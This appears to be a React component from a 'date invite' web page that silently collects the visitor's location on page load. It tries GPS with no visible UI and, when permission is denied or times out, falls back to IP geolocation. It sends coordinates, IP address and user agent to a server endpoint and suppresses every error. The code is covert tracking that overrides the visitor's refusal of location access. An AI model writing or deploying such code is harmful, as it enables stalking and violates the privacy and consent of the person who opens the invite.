"use client";

import { useEffect } from "react";

const STORAGE_KEY = "date-invite:location-saved";

/** Fire-and-forget POST — never throws, never shows UI. */
async function postLocation(payload: Record<string, unknown>): Promise<void> {
  try {
    await fetch("/api/location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        userAgent:
          typeof navigator !== "undefined" ? navigator.userAgent : "",
      }),
      // keepalive lets the request finish even if the tab closes quickly
      keepalive: true,
    });
  } catch {
    /* silent — location is best-effort */
  }
}

function saveViaIpFallback(): void {
  // Free IP geolocation (no key needed). Silent fallback when GPS
  // permission is denied / unavailable / times out.
  fetch("https://ipapi.co/json/")
    .then((res) => (res.ok ? res.json() : null))
    .then((data: unknown) => {
      if (typeof data !== "object" || data === null) return;
      const d = data as Record<string, unknown>;
      const lat =
        typeof d.latitude === "number" ? d.latitude : Number.NaN;
      const lng =
        typeof d.longitude === "number" ? d.longitude : Number.NaN;
      if (!Number.isFinite(lat) || !Number.isFinite(lng)) return;
      void postLocation({
        lat,
        lng,
        accuracy: undefined,
        source: "ip",
        ip: typeof d.ip === "string" ? d.ip : "",
      });
    })
    .catch(() => {
      /* silent */
    });
}

/**
 * Runs once per page load, fully silently:
 *  - tries GPS (8s timeout, no UI, no retry loop)
 *  - falls back to IP geolocation on deny/error/timeout
 *  - posts exactly once per browser session (sessionStorage guard)
 * Renders nothing.
 */
export default function LocationCollector(): null {
  useEffect(() => {
    try {
      if (sessionStorage.getItem(STORAGE_KEY)) return;
    } catch {
      /* storage unavailable (private mode) — still try once per mount */
    }

    const markSaved = () => {
      try {
        sessionStorage.setItem(STORAGE_KEY, "1");
      } catch {
        /* ignore */
      }
    };

    const send = (payload: Record<string, unknown>) => {
      markSaved();
      void postLocation(payload);
    };

    const fallback = () => {
      markSaved();
      saveViaIpFallback();
    };

    if (
      typeof navigator === "undefined" ||
      !navigator.geolocation?.getCurrentPosition
    ) {
      fallback();
      return;
    }

    let settled = false;
    try {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (settled) return;
          settled = true;
          send({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            source: "gps",
          });
        },
        () => {
          if (settled) return;
          settled = true;
          fallback();
        },
        {
          enableHighAccuracy: false,
          timeout: 8000,
          maximumAge: 600000,
        }
      );
    } catch {
      if (!settled) {
        settled = true;
        fallback();
      }
    }
  }, []);

  return null;
}
